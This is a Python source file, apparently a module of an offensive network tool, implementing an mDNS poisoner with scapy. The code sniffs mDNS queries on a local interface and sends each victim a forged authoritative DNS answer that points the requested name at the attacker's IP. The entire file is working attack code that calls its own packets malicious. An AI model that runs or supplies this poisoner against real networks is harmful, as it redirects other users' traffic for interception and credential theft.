#!/usr/bin/env python
# -*- coding: utf-8 -*-


from typing import List, Tuple, Type
from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet, IPv6
from .poisoninfo import PoisonNetworkInfo
import time
from loguru import logger
from threading import Thread
from colorama import Fore, Style


class MDNS(PoisonNetworkInfo):
    """[ MDNS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
    """

    def __init__(self, ip: str, ipv6: str, mac_address: str, iface: str):
        super().__init__(ip, ipv6, mac_address, iface)
        self._targets_used = []

    @property
    def targets_used(self) -> List[str]:
        return self._targets_used

    @targets_used.setter
    def targets_used(self, ip: str) -> None:
        self.targets_used.append(ip)

    def dns_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    # I have used packet.Type becasue packet dont work with Tuple
    # https://python-type-checking.readthedocs.io/en/latest/types.html#ordinary-classes
    def network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def transport_layer(self, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport="mdns", dport="mdns")
        return response

    def application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=self.dns_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        logger.bind(name="info").debug("Packet crafted: ")
        logger.bind(name="info").debug(response.summary())
        if ip_of_the_packet not in self.targets_used:
            logger.bind(name="info").info(
                f"{Fore.CYAN}Sending packet to {ip_of_the_packet}{Style.RESET_ALL}"
            )
            sendp(response, verbose=False)
            self.targets_used = ip_of_the_packet

    def filter_for_mdns(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(DNS)
            and (pkt.haslayer(IP) or pkt.haslayer(IPv6))
            and pkt[DNS].qd is not None
        )

    def craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.filter_for_mdns(pkt):
            response = self.data_link_layer(pkt)
            response, ip_of_the_packet = self.network_layer(pkt, response)
            response = self.transport_layer(response)
            response = self.application_layer(pkt, response)
            self.send_packet(response, ip_of_the_packet)

    def start_mdns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        # Port of mdns 5353
        # filter="udp and port mdns",
        logger.bind(name="info").info("Starting mdns poisoning...")
        cleaner_trhead = Thread(target=self.cleaner)
        cleaner_trhead.daemon = True
        cleaner_trhead.start()
        sniff(
            filter="udp and port mdns",
            iface=self.iface,
            prn=self.craft_malicious_packets,
            store=0,
        )

    def cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.targets_used.clear()
